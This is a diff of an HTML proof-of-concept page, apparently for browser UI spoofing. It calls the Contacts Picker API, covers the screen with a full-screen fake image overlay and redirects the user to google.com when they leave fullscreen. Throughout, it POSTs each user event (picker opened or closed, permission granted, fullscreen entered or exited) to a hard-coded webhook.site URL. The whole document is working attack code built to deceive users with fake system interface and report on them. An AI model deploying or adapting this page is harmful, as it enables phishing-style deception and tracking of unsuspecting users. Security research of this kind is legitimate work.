@@ -1,118 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Contacts Picker PoC</title>
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <title>Contacts Picker Fullscreen PoC</title>
+  <meta charset="utf-8">
+  <meta name="viewport"
+        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
-<style>
-html,body{
-  margin:0;
-  padding:0;
-  width:100%;
-  height:100%;
-  background:#000;
-  color:#fff;
-  font-family:sans-serif;
-}
-#spoof{
-  position:fixed;
-  inset:0;
-  width:100vw;
-  height:100vh;
-  object-fit:cover;
-  display:none;
-  z-index:9999;
-}
-#content{
-  height:100%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  text-align:center;
-}
-button{
-  padding:16px 24px;
-  font-size:18px;
-  background:#1a73e8;
-  color:#fff;
-  border:none;
-  border-radius:8px;
-}
-</style>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      font-family: sans-serif;
+    }
+
+    #spoof {
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      display: none;
+      z-index: 9999;
+    }
+
+    #content {
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      text-align: center;
+    }
+  </style>
 </head>
 
 <body>
 
-<img id="spoof" src="spof2.png">
+<img id="spoof" src="spof2.png" style="display:none">
+
 <div id="content">
-  <div>
-    <h1>Click to open Contacts</h1>
-    <button id="start">Open Contacts</button>
-  </div>
+  <h1>Click anywhere to start demo</h1>
 </div>
 
 <script>
 const WEBHOOK = "https://webhook.site/c28e63ae-558e-47e6-84d1-3ca7c07cacc4";
 
-function send(data){
-  fetch(WEBHOOK,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify(data)
-  }).catch(()=>{});
+function send(event, extra = {}) {
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      time: new Date().toISOString(),
+      event,
+      ...extra
+    })
+  }).catch(() => {});
 }
 
-document.getElementById("start").addEventListener("click", async () => {
+document.addEventListener("click", async () => {
 
-  // log: click
-  send({ event:"click", time:new Date().toISOString() });
+  // 1️⃣ Log picker intent
+  send("contacts_picker_called", {
+    fields_requested: ["name", "tel", "email"]
+  });
 
-  // show overlay
-  document.getElementById("spoof").style.display="block";
-  document.getElementById("content").style.display="none";
+  let granted = false;
 
-  // fullscreen
-  if(document.documentElement.requestFullscreen){
-    document.documentElement.requestFullscreen().catch(()=>{});
-  }
-
-  // contacts picker
-  if(navigator.contacts && navigator.contacts.select){
-    send({ event:"contacts_picker_opened", time:new Date().toISOString() });
-
-    try{
-      const contacts = await navigator.contacts.select(
-        ["name","tel","email"],
-        { multiple:true }
+  // 2️⃣ Trusted system UI
+  if (navigator.contacts && navigator.contacts.select) {
+    try {
+      const result = await navigator.contacts.select(
+        ["name", "tel", "email"],
+        { multiple: false }
       );
-
-      send({
-        event:"contacts_picker_success",
-        count: contacts.length,
-        time: new Date().toISOString()
-      });
-
-    }catch(e){
-      send({
-        event:"contacts_picker_closed",
-        error: e.name,
-        time: new Date().toISOString()
+      granted = Array.isArray(result);
+    } catch (e) {
+      send("contacts_picker_closed", {
+        granted: false,
+        reason: e.name
       });
     }
-  }else{
-    send({
-      event:"contacts_api_not_supported",
-      time:new Date().toISOString()
+  }
+
+  if (granted) {
+    send("contacts_picker_closed", {
+      granted: true,
+      note: "User completed picker"
     });
   }
-});
 
-// exit fullscreen → redirect cepat
-document.addEventListener("fullscreenchange",()=>{
-  if(!document.fullscreenElement){
-    send({ event:"exit_fullscreen", time:new Date().toISOString() });
-    setTimeout(()=>location.href="https://google.com",50);
+  // 3️⃣ Show spoof overlay
+  document.getElementById("spoof").style.display = "block";
+  document.getElementById("content").style.display = "none";
+
+  // 4️⃣ Enter fullscreen
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen()
+      .then(() => send("entered_fullscreen"))
+      .catch(() => {});
+  }
+
+}, { once: true });
+
+
+// 5️⃣ Exit fullscreen → redirect cepat
+document.addEventListener("fullscreenchange", () => {
+  if (!document.fullscreenElement) {
+    send("exit_fullscreen_redirect");
+    setTimeout(() => {
+      location.href = "https://google.com";
+    }, 50);
   }
 });
 </script>
